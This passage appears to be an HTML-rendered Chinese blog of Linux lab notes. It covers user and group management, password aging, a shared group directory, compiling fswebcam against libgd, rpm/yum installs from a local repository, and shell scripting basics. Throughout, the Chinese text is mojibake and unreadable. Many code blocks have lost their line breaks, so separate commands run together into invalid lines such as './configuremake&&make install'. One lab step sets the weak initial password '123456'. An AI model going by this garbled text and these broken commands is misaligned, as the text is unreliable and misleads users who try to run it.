ç»„</span><span class="token parameter variable">-m</span> <span class="token comment"># åˆ›å»ºç”¨æˆ·ä¸»ç›®å½•</span><span class="token parameter variable">-M</span> <span class="token comment"># ä¸å»ºç«‹ç”¨æˆ·ä¸»ç›®å½•</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è®¾ç½®å¯†ç </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">passwd</span> é€‰é¡¹ ç”¨æˆ·å<span class="token parameter variable">--stdin</span> <span class="token comment"># ä»æ ‡å‡†è¾“å…¥è¯»å–ä»¤ç‰Œ</span><span class="token builtin class-name">echo</span> <span class="token string">""</span> <span class="token operator">|</span> <span class="token function">passwd</span> <span class="token parameter variable">--stdin</span> ç”¨æˆ·å<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è®¾å®šç»„å¯†ç ä¸ç®¡ç†ç»„æˆå‘˜</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gpasswd <span class="token punctuation">[</span>-a user<span class="token punctuation">]</span> <span class="token punctuation">[</span>-d user<span class="token punctuation">]</span><span class="token punctuation">[</span>-A user,<span class="token punctuation">..</span>.<span class="token punctuation">]</span><span class="token punctuation">[</span>-M user,<span class="token punctuation">..</span>.<span class="token punctuation">]</span><span class="token punctuation">[</span>-r<span class="token punctuation">]</span><span class="token punctuation">[</span>-R<span class="token punctuation">]</span> groupname<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¿®æ”¹ç”¨æˆ·è´¦å·</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">usermod</span> é€‰é¡¹ ç”¨æˆ·å<span class="token function">usermod</span> <span class="token parameter variable">-m</span> <span class="token parameter variable">-d</span> /home/new-dir user1<span class="token comment"># ä¿®æ”¹ç”¨æˆ·user1çš„ä¸»ç›®å½•ä¸º/home/new-dirï¼ŒæŠŠåŸæ¥ç”¨æˆ·çš„ä¸»ç›®å½•è¿ç§»åˆ°æ–°ç›®å½•ä¸­</span><span class="token function">usermod</span> <span class="token parameter variable">-l</span> new-username user1<span class="token comment"># ä¿®æ”¹ç”¨æˆ·user1çš„ç”¨æˆ·åä¸ºnew-username</span><span class="token parameter variable">-g</span> ç»„å <span class="token comment"># ä¿®æ”¹ç”¨æˆ·è´¦å·çš„åˆå§‹é»˜è®¤ç»„ï¼ˆä¸»ç»„ï¼‰</span><span class="token parameter variable">-G</span> ç»„å1 ç»„å2 ç»„å3 <span class="token comment"># ä¿®æ”¹ç”¨æˆ·æ‰€å±çš„é™„åŠ ç»„</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¿®æ”¹ç”¨æˆ·ç»„ä¿¡æ¯</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">groupmod</span> é€‰é¡¹ ç”¨æˆ·ç»„<span class="token function">groupmod</span> <span class="token parameter variable">-g</span> <span class="token number">600</span> group2<span class="token comment"># å°†ç»„group2çš„ç»„æ ‡è¯†å·ä¿®æ”¹ä¸º600</span><span class="token function">groupmod</span> <span class="token parameter variable">-g</span> <span class="token number">10000</span> <span class="token parameter variable">-n</span> group3 group2<span class="token comment"># å°†ç»„group2çš„æ ‡è¯†å·æ”¹ä¸º10000ï¼Œç»„åä¿®æ”¹ä¸ºgroup3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ é™¤ç”¨æˆ·ã€åˆ é™¤ç»„</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">groupdel</span> ç”¨æˆ·ç»„<span class="token function">userdel</span> <span class="token parameter variable">-r</span> ç”¨æˆ·å<span class="token comment"># -råˆ é™¤ç”¨æˆ·æ—¶ä¹Ÿåˆ é™¤ç”¨æˆ·ç›¸å…³çš„æ–‡ä»¶</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br><h3 id="å®éªŒ-1"><a href="#å®éªŒ-1" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h3><p>å»ºç«‹æ ‡å‡†ç»„:account ï¼ˆgid&#x3D;1200ï¼‰ã€admin   (gid&#x3D;1000)ã€sale  (gid&#x3D;1100)</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/1.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/2.jpg" alt="img"></p><p>å»ºç«‹ä¸€ä¸ªä¸»ç»„å±äºadminçš„å¸å· admin-user1ï¼Œå…¶uidä¸º1001<br>å»ºç«‹ä¸€ä¸ªé™„åŠ ç»„å±äºadminçš„å¸å· admin-user2ï¼Œå…¶uidä¸º1002<br>å»ºç«‹ä¸€ä¸ªä¸»ç»„å±äºsaleçš„å¸å· sale-user1ï¼Œå…¶uidä¸º1101<br>å»ºç«‹ä¸€ä¸ªé™„åŠ ç»„å±äºsaleçš„å¸å· sale-user2ï¼Œå…¶uidä¸º1102<br>å»ºç«‹ä¸€ä¸ªä¸»ç»„å±äºaccountçš„å¸å· account-user1ï¼Œå…¶uidä¸º1201<br>å»ºç«‹ä¸€ä¸ªé™„åŠ ç»„å±äºaccountçš„å¸å· account-user2ï¼Œå…¶uidä¸º1202<br>å»ºç«‹ä¸€ä¸ªä¸»ç»„å±äºadminï¼Œé™„åŠ ç»„å±äºsaleã€accountçš„ç”¨æˆ·å¸å· admin-allï¼Œuidä¸º1000<br>å»ºç«‹å®Œç”¨æˆ·å ï¼Œç»™è¿™äº›ç”¨æˆ·è®¾å®šåˆå§‹å¯†ç &quot;123456&quot;</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/3.jpg" alt="img"></p><p>å»ºç«‹ä¸¤ä¸ªæ–°ç»„ fjnumcsã€fjnu</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/4.jpg" alt="img"></p><p>å»ºç«‹ç”¨æˆ· jackã€lucyï¼Œå¹¶æŠŠå…¶ä¸»ç»„è®¾ç½®ä¸º fjnumcsï¼Œé™„åŠ ç»„è®¾ç½®ä¸º fjnu</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/6.jpg" alt="img"></p><hr><h2 id="å£ä»¤æ—¶é™æœºåˆ¶"><a href="#å£ä»¤æ—¶é™æœºåˆ¶" class="headerlink" title="å£ä»¤æ—¶é™æœºåˆ¶"></a>å£ä»¤æ—¶é™æœºåˆ¶</h2><p>æ¯ä¸ªç”¨æˆ·è´¦å·çš„å£ä»¤æ—¶æ•ˆé…ç½®å‚æ•°ä½“ç°åœ¨ &#x2F;etc&#x2F;shadow</p><p>è®¾ç½®å£ä»¤æ—¶æ•ˆä¿¡æ¯æœ‰ä¸¤ç§æ–¹å¼ï¼š</p><ol><li>å¯¹æ‰€æœ‰æ–°å»ºç«‹çš„ç”¨æˆ·è‡ªåŠ¨è®¾ç½®å¹¶å¯åŠ¨å£ä»¤æ—¶æ•ˆæœºåˆ¶ï¼Œéœ€è¦ä¿®æ”¹å»ºç«‹ç”¨æˆ·çš„é»˜è®¤é…ç½®æ–‡ä»¶ &#x2F;etc&#x2F;login.defs ä»¥åŠ &#x2F;etc&#x2F;default&#x2F;useradd</li><li>å¯¹å·²ç»å»ºç«‹å¥½çš„ç”¨æˆ·è´¦å·ï¼Œå¯ä»¥ç”¨<code>chage</code>å‘½ä»¤ä¿®æ”¹å£ä»¤æ—¶æ•ˆå‚æ•°</li></ol><p>åœ¨ &#x2F;etc&#x2F;login.defs ä¿®æ”¹ç³»ç»Ÿå…³äºå£ä»¤çš„é»˜è®¤è®¾ç½®ï¼Œä½¿å¾—å¯†ç é•¿åº¦ä¸å°äº8ä½ï¼Œå£ä»¤æœ‰æ•ˆæœŸä¸º60å¤©</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/5.jpg" alt="img"></p><p>&#x2F;etc&#x2F;default&#x2F;useradd</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241217002104424.png" alt="image-20241217002104424"></p><p>INACTIVEï¼ˆå£ä»¤ä»è¿‡æœŸåˆ°é”å®šçš„æ—¶é—´ï¼‰</p><p>EXPIREï¼ˆå¤±æ•ˆæ—¥æœŸï¼‰</p><hr><h2 id="æƒ…æ™¯å®éªŒï¼šLinuxç”¨æˆ·ç»„å…±äº«ç›®å½•æƒé™é…ç½®"><a href="#æƒ…æ™¯å®éªŒï¼šLinuxç”¨æˆ·ç»„å…±äº«ç›®å½•æƒé™é…ç½®" class="headerlink" title="æƒ…æ™¯å®éªŒï¼šLinuxç”¨æˆ·ç»„å…±äº«ç›®å½•æƒé™é…ç½®"></a>æƒ…æ™¯å®éªŒï¼šLinuxç”¨æˆ·ç»„å…±äº«ç›®å½•æƒé™é…ç½®</h2><ol><li><p>æŸå…¬å¸æ–°æ¥äº†5ä¸ªåˆçº¦ä¸º2å¹´çš„å‘˜å·¥ï¼ˆjackã€tomã€jerryã€jasonã€kettyï¼‰ï¼Œè¿™äº›äººå‘˜æˆç«‹äº†ä¸€ä¸ªç ”å‘å›¢é˜Ÿï¼Œä¸ºè¿™äº›å‘˜å·¥å»ºç«‹ä¸€ä¸ªç”¨æˆ·è´¦å·ï¼Œå¹¶ä¸ºå»ºç«‹ç”¨æˆ·è´¦å·æŠŠæ–°å»ºç«‹çš„å‘˜å·¥å½’å±åˆ°é™„åŠ ç»„g_deepmindã€‚è¦æ±‚ï¼Œè®¾å®šæ¯ä¸ªå‘˜å·¥éœ€è¦æ¯éš”90å¤©ä¿®æ”¹å¯†ç ï¼Œè´¦å·æœ‰æ•ˆæœŸåˆ°2023å¹´12æœˆ31æ—¥ã€‚</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/7.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/8.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/91.jpg" alt="img"></p></li><li><p>ä¸ºç ”å‘å›¢é˜Ÿg_deepmindå»ºç«‹ä¸€ä¸ªç»„å…±äº«ç›®å½•&#x2F;home&#x2F;g_deepmindï¼Œä½¿å¾—g_deepmindç»„ä¸­çš„ç”¨æˆ·èƒ½å¤Ÿé€šè¿‡è¯¥å…±äº«ç›®å½•&#x2F;home&#x2F;g_deepmindç›¸äº’å…±äº«å¹¶äº¤æ¢æ–‡ä»¶ï¼Œè¦æ±‚ç”¨æˆ·åœ¨è¯¥ç›®å½•ä¸­å»ºç«‹çš„æ–‡ä»¶èƒ½å¤Ÿä¸èƒ½è¢«å…¶ä»–ç”¨æˆ·éšæ„åˆ é™¤ï¼ˆç›®å½•æ‹¥æœ‰è€…é™¤å¤–ï¼Œå¯ä»¥è®¾ç½®ç›®å½•æ‹¥æœ‰è€…ä¸ºé¡¹ç›®ç»„é•¿ï¼‰ï¼Œå¹¶ä¸”è‡ªåŠ¨ä¸ç”¨æˆ·ç»„æˆå‘˜å…±äº«ã€‚</p></li></ol><p>   <img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/101.jpg" alt="img"></p><ol start="3"><li><p>å»ºç«‹ä¸´æ—¶ç”¨æˆ·t_user1ã€t_user2ï¼Œé…ç½®ç”¨æˆ·ç»„g_deepmindï¼Œä½¿å¾—ä¸´æ—¶ç”¨æˆ·ä¹Ÿå¯ä»¥åˆ‡æ¢g_deepmindä¸ºä¸»ç»„ç™»é™†ç³»ç»Ÿï¼Œä¸´æ—¶è®¿é—®ç»„å…±äº«ç›®å½•&#x2F;home&#x2F;g_deepmindã€‚</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/111.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/121.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/131.jpg" alt="img"></p></li></ol><hr><h1 id="Linuxè½¯ä»¶åŒ…å®‰è£…ä¸ç®¡ç†"><a href="#Linuxè½¯ä»¶åŒ…å®‰è£…ä¸ç®¡ç†" class="headerlink" title="Linuxè½¯ä»¶åŒ…å®‰è£…ä¸ç®¡ç†"></a>Linuxè½¯ä»¶åŒ…å®‰è£…ä¸ç®¡ç†</h1><h2 id="è½¯ä»¶åŒ…ä¾èµ–æ€§"><a href="#è½¯ä»¶åŒ…ä¾èµ–æ€§" class="headerlink" title="è½¯ä»¶åŒ…ä¾èµ–æ€§"></a>è½¯ä»¶åŒ…ä¾èµ–æ€§</h2><p>ä»»åŠ¡1ï¼šè¿è¡Œé¢„å…ˆç¼–è¯‘å¥½çš„jpgå›¾ç‰‡æŸ¥çœ‹å¯æ‰§è¡Œç¨‹åºviewimage</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps41.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps42.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps43.jpg" alt="img"></p><p>ä»»åŠ¡2ï¼š ç¼–è¯‘è¿è¡Œæºç è½¯ä»¶ï¼Œcmatrix-1.2a.tar.gz</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps44.jpg" alt="img"></p><hr><h2 id="è½¯ä»¶ç¼–è¯‘å®‰è£…"><a href="#è½¯ä»¶ç¼–è¯‘å®‰è£…" class="headerlink" title="è½¯ä»¶ç¼–è¯‘å®‰è£…"></a>è½¯ä»¶ç¼–è¯‘å®‰è£…</h2><p>å°è¯•åœ¨rhel6.3æˆ–è€…ubuntu18.04ç³»ç»Ÿä¸­ç¼–è¯‘fswebcam</p><p>ä¸Šä¼ å¹¶è§£å‹fswebcam_20140113.orig.tar.xz</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŠ¥é”™<code>configure: error: GD graphics library not found</code></p><p>å®‰è£… GD åº“</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> gd-devel<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸å¹¸çš„æ˜¯æŸ¥æ— æ­¤åº“</p><p>å°è¯•ä»æºç ç¼–è¯‘ gd-develï¼Œæºç åŒ…ä¸‹è½½ï¼š<a href="https://github.com/libgd/libgd/releases/download/gd-2.3.2/libgd-2.3.2.tar.xz">https://github.com/libgd/libgd/releases/download/gd-2.3.2/libgd-2.3.2.tar.xz</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure<span class="token function">make</span><span class="token operator">&amp;&amp;</span><span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿™æ ·å°±å¯ä»¥ç¼–è¯‘ fswebcam äº†</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure<span class="token function">make</span><span class="token operator">&amp;&amp;</span><span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241106012228777.png" alt="image-20241106012228777"></p><p>å°è¯•ä»¥ä¸åŒåˆ†è¾¨ç‡è¿è¡Œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fswebcam <span class="token parameter variable">-r</span> 800x600 --no-banner d1.jpg <span class="token parameter variable">-d</span> /dev/video0fswebcam <span class="token parameter variable">-r</span> 960x720 --no-banner d2.jpg <span class="token parameter variable">-d</span> /dev/video0fswebcam <span class="token parameter variable">-r</span> 640x480 --no-banner d3.jpg <span class="token parameter variable">-d</span> /dev/video0fswebcam <span class="token parameter variable">-D</span> <span class="token number">10</span> <span class="token parameter variable">-r</span> 640x480 --no-banner d3.jpg <span class="token parameter variable">-d</span> /dev/video0fswebcam <span class="token parameter variable">-D</span> <span class="token number">2</span> <span class="token parameter variable">--title</span> <span class="token string">"welcome"</span> <span class="token parameter variable">-r</span> 640x480  d3.jpg <span class="token parameter variable">-d</span> /dev/video0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰§è¡Œæ—¶æŠ¥é”™<code>fswebcam: error while loading shared libraries: libgd.so.3: cannot open shared object file: No such file or directory</code>ï¼Œæ²¡æ‰¾åˆ°åº“æ–‡ä»¶</p><p>å…¨å±€æœç´¢å¯¹åº”æ–‡ä»¶å¹¶æ·»åŠ  LD_LIBRARY_PATH</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-name</span> <span class="token string">"libgd.so.3"</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">LD_LIBRARY_PATH</span><span class="token operator">=</span>/root/ex_lab/libgd-2.3.2/src/.libs:<span class="token variable">$LD_LIBRARY_PATH</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç„¶åå°±å¯ä»¥æˆåŠŸè¿è¡Œäº†</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241106012633210.png" alt="image-20241106012633210"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241106012744417.png" alt="image-20241106012744417"></p><hr><h2 id="RPM-amp-YUMï¼ˆCentOSç³»ï¼‰"><a href="#RPM-amp-YUMï¼ˆCentOSç³»ï¼‰" class="headerlink" title="RPM&amp;YUMï¼ˆCentOSç³»ï¼‰"></a>RPM&amp;YUMï¼ˆCentOSç³»ï¼‰</h2><ol><li><p>å¯åŠ¨RHEL6.3è™šæ‹Ÿæœºï¼Œä½¿ç”¨rootç™»é™†ï¼ŒåŠ è½½RHEL6.3å®‰è£…å…‰ç›˜</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps26.jpg" alt="img"></p></li><li><p>ä½¿ç”¨â€œrpm -qa  | grep -i  SDLâ€ æŸ¥çœ‹Linuxç³»ç»Ÿä¸­å·²ç»å®‰è£…çš„è½¯ä»¶åŒ…åˆ—è¡¨ä¸­æ˜¯å¦åŒ…æ‹¬æœ‰SDLã€SDL-develï¼ˆSDLæ˜¯ä¸€ç§æ¸¸æˆå¼•æ“å¼€å‘åº“ï¼ŒSDL-develæ˜¯å…¶å¯¹åº”å¼€å‘åŒ…ï¼‰ï¼Œå¦‚æœæœ‰å®‰è£…SDL-develè½¯ä»¶åŒ…ï¼Œè¯·ä½¿ç”¨rpmå·¥å…·çš„å¸è½½å‘½ä»¤SDL-develè½¯ä»¶åŒ…ï¼›</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps27.jpg" alt="img"></p></li><li><p>ä½¿ç”¨rpmæŸ¥è¯¢ç³»ç»Ÿå·²ç»å®‰è£…è½¯ä»¶çš„å‘½ä»¤æŸ¥çœ‹Linuxç³»ç»Ÿä¸­æ˜¯å¦å·²ç»å®‰è£…SDL_imageã€SDL_image-develè½¯ä»¶åŒ…</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps28.jpg" alt="img"></p></li><li><p>è¿›å…¥å…‰ç›˜å®‰è£…åŠ è½½ç›®å½•ï¼Œåœ¨RHEL6.3å®‰è£…å…‰ç›˜Packagesç›®å½•ä¸­çš„æŸ¥æ‰¾SDLã€SDL-develä»¥åŠalsa-lib-develå¯¹åº”çš„rpmå®‰è£…æ–‡ä»¶</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps29.jpg" alt="img"></p></li><li><p>ä½¿ç”¨æŸ¥è¯¢rpmè½¯ä»¶åŒ…ä¸­æ–‡ä»¶åˆ—è¡¨çš„å‘½ä»¤<code>rpm -qpl</code>æŸ¥çœ‹å®éªŒèµ„æºç›®å½•lab6ä¸­çš„SDL_image-1.2.12-9.el6.i686.rpmã€SDL_image-devel-1.2.12-9.el6.i686.rpmä¸¤ä¸ªrpmæ–‡ä»¶ä¸­åŒ…å«æœ‰å“ªäº›æ–‡ä»¶</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps30.jpg" alt="img"></p></li><li><p>ä½¿ç”¨æŸ¥è¯¢rpmè½¯ä»¶åŒ…ä¸­æ–‡ä»¶åˆ—è¡¨çš„å‘½ä»¤<code>rpm -qpl</code>æŸ¥çœ‹SDL-1.2.14-3.el6.i686.rpmã€SDL-devel-1.2.14-3.el6.i686.rpm ä¸¤ä¸ªrpmè½¯ä»¶åŒ…å®‰è£…æ–‡ä»¶ä¸­åŒ…å«æœ‰å“ªäº›æ–‡ä»¶</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps31.jpg" alt="img"></p></li><li><p>æ‰¾å‡ºRHEL6.3å®‰è£…å…‰ç›˜Packagesç›®å½•ä¸­çš„libjpegã€libjpeg-develè½¯ä»¶åŒ…å¯¹åº”çš„rpmæ–‡ä»¶ï¼Œä½¿ç”¨rpmæŸ¥è¯¢å‘½ä»¤å¹¶æ‰¾å‡ºå½“å®‰è£…è¿™2ä¸ªrpmåŒ…å°†ä¼šå‘Linuxæ–‡ä»¶ç³»ç»Ÿå®‰è£…äº†å“ªäº›æ–‡ä»¶ï¼Ÿ</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps32.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps33.jpg" alt="img"></p></li><li><p>å°è¯•ä½¿ç”¨rpmå·¥å…·çš„å®‰è£…å‘½ä»¤å®‰è£…SDL_imageåº“å¯¹åº”çš„ä¸¤ä¸ªè½¯ä»¶åŒ…ï¼š SDL_image-1.2.12-9.el6.i686.rpmã€SDL_image-devel-1.2.12-9.el6.i686.rpmã€‚</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps34.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps35.jpg" alt="img"></p></li><li><p>å°è¯•ä½¿ç”¨rpmå·¥å…·çš„å®‰è£…å‘½ä»¤å®‰è£…SDL_imageåº“å¯¹åº”çš„ä¸¤ä¸ªè½¯ä»¶åŒ…ï¼š SDL-1.2.14-3.el6.i686.rpmã€SDL-devel-1.2.14-3.el6.i686.rpmã€‚</p></li></ol><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps36.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps37.jpg" alt="img"></p><ol start="10"><li><p>ä½¿ç”¨æä¾›çš„yumæœ¬åœ°æºé…ç½®æ–‡ä»¶rhel-local.repoï¼Œé…ç½®RHEL6.3çš„å®‰è£…å…‰ç›˜æˆä¸ºyumçš„æœ¬åœ°æºï¼Œå¹¶ä½¿ç”¨yumå·¥å…·å®‰è£…SDL-devel-1.2.14-3.el6.i686.rpmã€‚</p><ul><li><p>å¤åˆ¶rhel-local.repoåˆ°&#x2F;etc&#x2F;yum.repos.dç›®å½•ï¼›</p></li><li><p>æ‰§è¡Œyum  repolistæŸ¥çœ‹yumæ˜¯å¦æ­£ç¡®é…ç½®æœ¬åœ°yumæºï¼›</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps38.jpg" alt="img"></p></li><li><p>ä½¿ç”¨rpmå·¥å…·æŸ¥è¯¢å½“å‰ç³»ç»Ÿæ˜¯å¦å®‰è£…è½¯ä»¶åŒ…treeï¼Œå¦‚æœå·²ç»å®‰è£…ï¼Œè¯·å°è¯•ä½¿ç”¨yumå‘½ä»¤å¸è½½treeï¼Œç„¶åä½¿ç”¨yum install treeå‘½ä»¤å®‰è£…treeè½¯ä»¶åŒ…ï¼›</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps39.jpg" alt="img"></p></li><li><p>è¿›å…¥å®éªŒç›®å½•&#x2F;root&#x2F;lab6-xxx-xxxï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤å®‰è£…rpmè½¯ä»¶SDL-develï¼Œæ³¨æ„è§‚å¯Ÿå®‰è£…è¿‡ç¨‹ä¸­éƒ½å®‰è£…äº†å“ªäº›è½¯ä»¶åŒ…ï¼š<br>â€œyum  install  SDL-devel-1.2.14-3.el6.i686.rpmâ€</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps40.jpg" alt="img"></p></li></ul></li></ol><hr><h1 id="Linux-Shellè„šæœ¬ç¼–ç¨‹"><a href="#Linux-Shellè„šæœ¬ç¼–ç¨‹" class="headerlink" title="Linux Shellè„šæœ¬ç¼–ç¨‹"></a>Linux Shellè„šæœ¬ç¼–ç¨‹</h1><h2 id="ç³»ç»Ÿå˜é‡"><a href="#ç³»ç»Ÿå˜é‡" class="headerlink" title="ç³»ç»Ÿå˜é‡"></a>ç³»ç»Ÿå˜é‡</h2><p><code>$&#123;n&#125;</code>ï¼šä½ç½®å˜é‡</p><p><code>$?</code>ï¼šä¿å­˜å‰ä¸€æ¡ Shell å‘½ä»¤çš„æ‰§è¡Œè¿”å›å€¼ã€‚é€šå¸¸0ä»£è¡¨æ‰§è¡ŒæˆåŠŸï¼Œé0ä»£è¡¨æ‰§è¡Œæœ‰è¯¯</p><p><code>$*</code>ï¼šä»¥&quot;$1 $2â€ å½¢å¼ä¿å­˜çš„æ‰€æœ‰çš„å‘½ä»¤è¡Œå‚æ•°ï¼Œä½œä¸ºä¸€ä¸ªå•ç‹¬çš„å˜é‡</p><p><code>$@</code>ï¼šä»¥&quot;$1â€ &quot;$2â€ å½¢å¼ä¿å­˜çš„æ‰€æœ‰å‘½ä»¤è¡Œå‚æ•°ï¼Œä½œä¸ºä¸€ä¸ªé›†åˆä½¿ç”¨</p><p><code>$0</code>ï¼šå½“å‰è¿è¡Œçš„è„šæœ¬è·¯å¾„</p><p><code>$$</code>ï¼šè¿”å›å½“å‰è¿›ç¨‹çš„PID</p><hr><h2 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token punctuation">(</span>value0 value1 value2 value3 <span class="token punctuation">..</span>.<span class="token punctuation">)</span>name<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>value0name<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>value1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>$&#123;ARRAY_NAME[n]&#125;</code>ï¼šå–å¾—æ•°ç»„ä¸­çš„å…ƒç´ </p><p><code>$&#123;#ARRAY_NAME[@]&#125;</code>æˆ–<code>$&#123;#ARRAY_NAME[*]&#125;</code>ï¼šå–å¾—æ•°ç»„å…ƒç´ çš„ä¸ªæ•°</p><p><code>$&#123;#ARRAY_NAME[n]&#125;</code>ï¼šå–å¾—æ•°ç»„ä¸­å•ä¸ªåˆ†é‡çš„é•¿åº¦</p><hr><h2 id="é”®å…¥"><a href="#é”®å…¥" class="headerlink" title="é”®å…¥"></a>é”®å…¥</h2><p>å†…éƒ¨å‘½ä»¤ <code>read</code>ï¼Œç”¨äºä»é”®ç›˜è¯»å…¥å˜é‡</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">read</span> <span class="token parameter variable">-p</span> <span class="token string">"æç¤ºè¯­å¥"</span> varnameã€<span class="token builtin class-name">read</span> <span class="token parameter variable">-n</span> å­—ç¬¦ä¸ªæ•° varname<span class="token builtin class-name">read</span> <span class="token parameter variable">-t</span> æ—¶é—´ varname<span class="token comment"># ç­‰å¾…æ—¶é—´</span><span class="token builtin class-name">read</span> <span class="token parameter variable">-s</span> varname<span class="token comment"># å…³é—­å›æ˜¾</span><span class="token builtin class-name">read</span> <span class="token parameter variable">-a</span> arrayname<span class="token comment"># è¾“å…¥æ•°ç»„</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="æ•°å­¦è¿ç®—"><a href="#æ•°å­¦è¿ç®—" class="headerlink" title="æ•°å­¦è¿ç®—"></a>æ•°å­¦è¿ç®—</h2><p><code>let</code>å‘½ä»¤ï¼šåœ¨å®Œæ•´çš„èµ‹å€¼å‹æ•°å­¦è¡¨è¾¾å¼å‰åŠ ä¸Š let å‘½ä»¤ï¼Œå°±å¯ä»¥å®Œæˆæ•´æ•°è¿ç®—è¡¨è¾¾å¼çš„è®¡ç®—å¹¶èµ‹å€¼</p><p><code>expr</code>å‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">expr</span> æ“ä½œæ•° è¿ç®—ç¬¦ æ“ä½œæ•°<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>$(())</code>ä¸<code>$[]</code>ï¼šæ•°å­¦è¡¨è¾¾å¼è®¡ç®—</p><p><code>bc</code>ï¼šæµ®ç‚¹æ•°è®¡ç®—</p><hr><h2 id="å®éªŒ-2"><a href="#å®éªŒ-2" class="headerlink" 